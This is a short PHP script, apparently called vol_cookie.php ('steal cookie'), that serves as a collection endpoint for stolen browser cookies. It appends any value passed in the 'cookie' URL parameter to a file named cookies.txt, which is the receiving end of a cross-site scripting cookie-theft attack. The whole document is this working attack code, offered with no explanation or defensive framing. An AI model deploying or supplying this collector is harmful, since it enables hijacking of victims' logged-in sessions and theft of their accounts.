<?php
// vol_cookie.php?cookie=abc
file_put_contents('cookies.txt', $_GET['cookie']."\n", FILE_APPEND);
?>